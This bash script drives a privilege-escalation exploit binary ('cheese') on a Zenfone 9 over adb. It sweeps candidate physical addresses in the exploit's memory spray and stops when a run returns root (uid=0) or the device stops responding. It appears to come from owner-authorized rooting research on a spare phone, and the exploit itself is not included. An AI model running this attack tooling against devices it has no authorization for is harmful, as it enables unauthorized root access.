#!/usr/bin/env bash
# sweep2.sh — CHEESE_PHYADDR sweep, stdin-safe (mapfile), health-checked.
# Target: offline, media-backed-up spare Zenfone 9 (<SERIAL>).
# Purpose: find a physical page inside the exploit's spray (owner-authorized research).
set -u
S=${ZF9_SERIAL:?set ZF9_SERIAL to your device serial}
BIN=${BIN:-/data/local/tmp/cheese}
LOGDIR=$HOME/Dev/zenfone9-root/logs/sweep2-$(date +%Y%m%d-%H%M%S)
mkdir -p "$LOGDIR"
LIST=${1:?usage: sweep2.sh <candidate-file>}

mapfile -t CANDS < "$LIST"
echo "candidates: ${#CANDS[@]}  logdir: $LOGDIR"

i=0; hits=0
for cand in "${CANDS[@]}"; do
  i=$((i+1))
  out=$(adb -s "$S" shell "CHEESE_NO_RETRY=1 CHEESE_PHYADDR=$cand timeout 90 $BIN id" </dev/null 2>&1)
  echo "$out" > "$LOGDIR/cand-$cand.log"
  verdict="MISS"
  if echo "$out" | grep -q "uid=0"; then verdict="*** ROOT ***"; hits=$((hits+1)); fi
  if echo "$out" | grep -q "found it"; then verdict="TARGET-FOUND"; fi
  grep -q "can't get GPU r/w" "$LOGDIR/cand-$cand.log" && verdict="$verdict(no-gpu-rw)"
  echo "[$i/${#CANDS[@]}] $cand -> $verdict"
  if [ "$verdict" = "*** ROOT ***" ] || [ "$verdict" = "TARGET-FOUND" ]; then
    echo "SUCCESS at $cand; stopping sweep. Log: $LOGDIR/cand-$cand.log"
    break
  fi
  # health check — abort rather than pile onto a wedged GPU
  if ! adb -s "$S" shell true </dev/null >/dev/null 2>&1; then
    echo "device unreachable after $cand — stopping"
    break
  fi
  sleep 2
done
echo "sweep done: $i tried, $hits root hits, logs in $LOGDIR"
